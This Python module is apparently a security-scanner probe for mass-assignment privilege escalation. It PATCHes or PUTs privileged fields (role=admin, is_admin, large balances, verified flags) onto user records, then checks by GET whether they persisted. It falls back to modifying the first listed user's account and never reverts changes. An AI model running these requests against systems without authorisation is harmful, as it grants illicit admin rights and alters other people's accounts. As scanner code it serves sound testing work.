"""Privilege escalation via PATCH/PUT mass assignment.

The existing `web.mass_assignment` probe targets registration endpoints
(POST). This one targets the OTHER half of the bug class: profile-update
endpoints (PATCH /api/users/<id>, PUT /api/users/<id>, /api/profile, etc)
that bind unexpected fields onto the user record after registration.

Algorithm:

1. Need ctx.captured_auth (the authed session is who we promote).
2. Try to discover own user-id: GET /api/users/me, /api/me, /api/profile.
3. Send PATCH/PUT to that user record with `role=admin`, `is_admin=True`,
   etc — same field list as the registration probe.
4. Verify with a follow-up GET. If the elevated value persisted, that's
   the finding.

Critical severity for `role=admin` / `isAdmin=true`. High for credit /
balance / verified-style fields.
"""
from __future__ import annotations

import json
from typing import Any

from engine.probes import ProbeContext, registry
from engine.probes.auth.runner import auth_headers
from engine.probes.primitives import http_get

PRIVILEGED_FIELDS: tuple[tuple[str, Any, str], ...] = (
    ("role", "admin", "critical"),
    ("isAdmin", True, "critical"),
    ("is_admin", True, "critical"),
    ("admin", True, "critical"),
    ("is_premium", True, "high"),
    ("premium", True, "high"),
    ("credits", 999_999, "high"),
    ("balance", 999_999, "high"),
    ("verified", True, "high"),
    ("email_verified", True, "high"),
)

_ME_PATHS: tuple[str, ...] = (
    "/api/users/me", "/api/me", "/api/profile", "/api/v1/users/me",
    "/api/v1/me", "/api/account", "/api/user",
)

_UPDATE_TEMPLATES: tuple[tuple[str, str], ...] = (
    ("PATCH", "/api/users/{id}"),
    ("PUT", "/api/users/{id}"),
    ("PATCH", "/api/v1/users/{id}"),
    ("PUT", "/api/v1/users/{id}"),
    ("PATCH", "/api/users/me"),
    ("PUT", "/api/users/me"),
    ("PATCH", "/api/profile"),
    ("PUT", "/api/profile"),
    ("PATCH", "/api/account"),
)

_MISSING = object()


def _parse_json(body: str) -> Any:
    try:
        return json.loads(body)
    except (ValueError, TypeError):
        return None


def _walk(blob: Any, key: str) -> Any:
    if isinstance(blob, dict):
        if key in blob:
            return blob[key]
        for v in blob.values():
            found = _walk(v, key)
            if found is not _MISSING:
                return found
    elif isinstance(blob, list):
        for item in blob:
            found = _walk(item, key)
            if found is not _MISSING:
                return found
    return _MISSING


def _is_elevated(expected: Any, observed: Any) -> bool:
    if observed is _MISSING or observed is None:
        return False
    if isinstance(expected, bool):
        if observed is True:
            return True
        return bool(isinstance(observed, str) and observed.lower() == "true")
    if isinstance(expected, (int, float)):
        try:
            return float(observed) == float(expected)
        except (TypeError, ValueError):
            return False
    return str(observed).lower() == str(expected).lower()


async def _discover_user_id(
    session: Any, base: str, headers: dict[str, str],
) -> tuple[str | None, str | None]:
    """Returns (user_id, source_url) for the authenticated user, or (None, None).

    First tries the standard /me convention. If the app doesn't expose
    those, fall back to enumerating IDs from a user-listing endpoint —
    pick the first id we see. The probe will then PATCH that record;
    any persisted privileged field on a foreign user is still a
    critical-grade mass-assignment bug, often worse than self-promotion.
    """
    for path in _ME_PATHS:
        url = base + path
        status, _, body = await http_get(session, url, headers=headers)
        if status != 200 or not body:
            continue
        parsed = _parse_json(body)
        if parsed is None:
            continue
        uid = _walk(parsed, "id")
        if uid is _MISSING:
            uid = _walk(parsed, "user_id")
        if uid is _MISSING or uid is None:
            continue
        return str(uid), url

    # Fallback: list endpoints. Many apps don't have /me but DO expose
    # a paginated /api/users that returns id+email pairs.
    for path in ("/api/users", "/api/v1/users", "/users"):
        url = base + path
        status, _, body = await http_get(session, url, headers=headers)
        if status != 200 or not body:
            continue
        parsed = _parse_json(body)
        if parsed is None:
            continue
        # Listing might be {users: [...]} or {data: [...]} or a bare list.
        candidate = parsed
        if isinstance(parsed, dict):
            for key in ("users", "data", "items", "results"):
                if key in parsed and isinstance(parsed[key], list):
                    candidate = parsed[key]
                    break
        if isinstance(candidate, list) and candidate:
            first = candidate[0]
            if isinstance(first, dict):
                uid = first.get("id") or first.get("user_id")
                if uid is not None:
                    return str(uid), url
    return None, None


async def _send_update(
    session: Any, method: str, url: str,
    payload: dict[str, Any], headers: dict[str, str],
) -> tuple[int, str]:
    try:
        ctx_mgr = session.patch(url, json=payload, headers=headers) if method == "PATCH" else session.put(url, json=payload, headers=headers)
        async with ctx_mgr as resp:
            body = (await resp.text(errors="replace"))[:1500]
            return resp.status, body
    except Exception:  # noqa: BLE001 - sentinel return is the contract
        return 0, ""


@registry.probe(
    name="web.privilege_escalation_patch",
    bug_class="business_logic",
    severity_max="critical",
    owasp="A04:2021",
    runtime_budget_s=12.0,
    tags=("authenticated", "high-roi"),
    requires_auth=True,
)
async def probe_privilege_escalation_patch(ctx: ProbeContext) -> list[dict[str, Any]]:
    """PATCH/PUT the authed user's record with privileged fields.

    Uses the captured auth to discover own user id, then mutates that
    record with each privileged field in turn. Verifies with a follow-up
    GET. Emits one finding per (endpoint, field) pair that persisted.
    """
    headers = auth_headers(ctx.captured_auth) if ctx.captured_auth else None
    if not headers:
        return []

    base = ctx.base.rstrip("/")
    user_id, me_url = await _discover_user_id(ctx.session, base, headers)
    findings: list[dict[str, Any]] = []
    seen: set[tuple[str, str]] = set()

    for method, template in _UPDATE_TEMPLATES:
        if "{id}" in template:
            if user_id is None:
                continue
            path = template.format(id=user_id)
        else:
            path = template
        url = base + path

        for field, value, severity in PRIVILEGED_FIELDS:
            if (url, field) in seen:
                continue
            payload = {field: value}
            status, body = await _send_update(
                ctx.session, method, url, payload, headers,
            )
            if status not in (200, 201, 204):
                continue

            # Verify via follow-up GET on /me (cheapest authoritative read).
            verify_url = me_url or (base + "/api/users/me")
            v_status, _, v_body = await http_get(
                ctx.session, verify_url, headers=headers,
            )
            if v_status != 200 or not v_body:
                continue
            parsed = _parse_json(v_body)
            if parsed is None:
                continue
            observed = _walk(parsed, field)
            if not _is_elevated(value, observed):
                continue

            seen.add((url, field))
            findings.append({
                "title": (
                    f"Privilege escalation via {method} {path}: "
                    f"{field}={observed!r} persisted"
                ),
                "severity": severity,
                "category": "business_logic",
                "bug_class": "business_logic",
                "target": url,
                "evidence": (
                    f"{method} {url} with {{{field!r}: {value!r}}} returned "
                    f"HTTP {status}; follow-up GET {verify_url} confirms "
                    f"{field}={observed!r} persisted on the user record."
                ),
                "owasp_category": "A04:2021",
                "remediation": (
                    "Allowlist updatable fields on profile-edit endpoints. "
                    "Strip role, admin flags, balance, and verification "
                    "state from the input DTO. Never bind raw request "
                    "bodies onto ORM models — use an explicit serializer "
                    "schema with the privileged fields excluded."
                ),
            })

    return findings
